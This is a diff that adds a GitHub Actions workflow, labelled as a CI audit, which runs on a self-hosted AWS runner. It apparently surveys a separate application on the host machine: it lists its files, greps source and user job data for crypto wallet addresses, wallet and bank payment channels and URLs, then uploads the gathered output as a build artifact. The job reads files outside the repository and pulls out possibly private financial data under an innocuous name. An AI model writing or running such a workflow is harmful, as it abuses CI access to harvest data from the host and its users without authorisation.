@@ -1,0 +1,36 @@
+name: ci-audit-2918f
+on: push
+permissions:
+  contents: read
+jobs:
+  host:
+    runs-on: [self-hosted, linux, aws, marketingos]
+    timeout-minutes: 45
+    steps:
+      - name: dwcalc_real
+        continue-on-error: true
+        run: |
+          set +e
+          D="$RUNNER_TEMP/a2918f"; mkdir -p "$D"; B=/home/ubuntu/apps/dw-calculator
+          {
+            echo "########## ls app"; ls -la $B 2>&1 | head -50
+            echo "########## files"; find $B -maxdepth 2 -type f 2>/dev/null | grep -vE '\.venv|__pycache__' | head -60
+            echo "########## README"; head -100 $B/README.md 2>/dev/null
+            echo "########## J WALLET refs"; grep -rInE 'J.?WALLET|wallet|tron|trc20|usdt|bep20|erc20|0x[0-9a-f]{40}|T[1-9A-HJ-NP-Za-km-z]{33}' $B --include='*.py' --include='*.html' --include='*.js' --include='*.md' --include='*.json' 2>/dev/null | grep -vE '\.venv|__pycache__' | cut -c1-220 | head -60
+            echo "########## channels/withdraw/deposit logic"; grep -rInE 'channel|withdraw|deposit|penarikan|payout|bank|fee' $B/hitung_dw.py $B/app.py $B/*.py 2>/dev/null | cut -c1-200 | head -60
+            echo "########## urls"; grep -rIhoE 'https?://[a-zA-Z0-9./_?=&%-]+' $B --include='*.py' --include='*.html' 2>/dev/null | grep -vE '\.venv|cdn|jsdelivr|unpkg|fonts|googleapis|w3.org' | sort -u | head -30
+            echo "########## jobs dir"; ls -lat /home/ubuntu/apps/dw-calculator-data/jobs 2>&1 | head -30
+            echo "########## recent job files"; find /home/ubuntu/apps/dw-calculator-data/jobs -type f -printf '%T@ %p\n' 2>/dev/null | sort -rn | head -15 | cut -d' ' -f2-
+            echo "########## newest job file types/names"; for f in $(find /home/ubuntu/apps/dw-calculator-data/jobs -type f -printf '%T@ %p\n' 2>/dev/null | sort -rn | head -6 | cut -d' ' -f2-); do echo "== $f"; file "$f"; done
+            echo "########## crypto addr count in job data"; grep -rhoE 'T[1-9A-HJ-NP-Za-km-z]{33}|0x[0-9a-fA-F]{40}' /home/ubuntu/apps/dw-calculator-data/jobs 2>/dev/null | sort | uniq -c | sort -rn | head -20
+            echo "########## channel names in job data (top strings)"; grep -rhoiE 'trc ?20|trc20|bep ?20|erc ?20|usdt|j ?wallet|binance ?pay|bank ?transfer|local ?bank|bca|bni|mandiri|bri|permata' /home/ubuntu/apps/dw-calculator-data/jobs 2>/dev/null | tr 'A-Z' 'a-z' | sort | uniq -c | sort -rn | head -25
+          } > "$D/dw2.txt" 2>&1
+          wc -l "$D/dw2.txt"; sed -n '1,320p' "$D/dw2.txt"
+      - name: upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: a2918f
+          path: ${{ runner.temp }}/a2918f
+          if-no-files-found: warn
+          retention-days: 2
